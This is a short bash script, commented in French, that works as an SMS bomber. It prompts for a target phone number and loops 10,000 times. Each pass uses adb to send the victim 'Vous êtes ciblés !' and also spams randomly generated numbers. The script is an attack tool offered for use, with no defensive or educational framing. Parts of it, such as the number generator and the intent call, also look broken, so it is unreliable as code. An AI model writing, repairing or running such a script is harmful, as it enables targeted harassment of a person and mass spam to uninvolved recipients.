#!/bin/bash

# Demander au utilisateur de saisir le numéro de téléphone à cibler
echo "Saisir le numéro de téléphone à cibler : "
read num

# Fonction pour générer des numéros de téléphone faux
function generer_num {
  echo $(echo "1234567890" | fold -w 2 | shuf -e)
}

# Fonction pour envoyer des messages en masse
function envoyer_message {
  num=$(generer_num)
  message="Ceci est un message automatique"
  adb shell am broadcast -a android.intent.action.SEND -d "sms:$num" -e "sms_body" "$message"
}

# Boucle pour envoyer des messages en masse
for ((i=0; i<10000; i++)); do
  # Envoyer le message ciblé au numéro précisé
  message="Vous êtes ciblés !"
  adb shell am broadcast -a android.intent.action.SEND -d "sms:$num" -e "sms_body" "$message"
  echo "Message ciblé envoyé à $num"

  # Ensuite, spamme avec les numéros générés
  envoyer_message
  sleep 0.01
done
